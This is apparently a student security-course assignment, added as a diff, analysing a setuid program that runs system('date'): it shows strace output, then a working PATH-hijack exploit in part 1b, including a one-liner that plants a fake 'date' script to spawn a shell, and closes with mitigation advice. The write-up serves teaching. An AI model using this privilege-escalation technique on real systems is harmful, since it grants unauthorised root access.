@@ -1,0 +1,32 @@
+Ciske Harsema - s1010048
+Stefan Jans - s1013414
+
+1a)
+
+The program essentially performs the following calls:
+
+setuid(0);
+setgid(0);
+system("date");
+
+which is apparent from strace by
+
+setuid(0)                               = -1 EPERM (Operation not permitted)
+setgid(0)                               = -1 EPERM (Operation not permitted)
+[pid  1984] execve("/bin/sh", ["sh", "-c", "date"], 0x7fff7255a548 /* 13 vars */) = 0
+
+A whole bunch of other system calls are generated (eg stat, mmap, read, etc) to actually perform these actions (most notably, it has to find the correct 'date' executable to execute, looking at various paths as defined in the PATH environment variable).
+
+1b)
+
+Place the 'date' bash script in /home/user1/ and then execute the following command to obtain a shell (assuming showdate is also in /home/user1/ with setuid):
+
+PATH=/home/user1:$PATH && ./showdate
+
+or as a one liner that just spawns a shell:
+
+PATH=/home/user1:$PATH && echo -e '#!/bin/sh\n/bin/sh' > date && chmod +x date && ./showdate 
+
+1c)
+
+Do not perform any actions that are subject to manipulation by a less priviledged user, eg via files in local search paths or environment variables. Ideally don't start other programs (especially via system). Any setuid program should be very careful to limit the exposure of priveledged operations, and minimize attack surface. In this case, providing a full path to the date binary in a protected path woud prevent this specific attack.
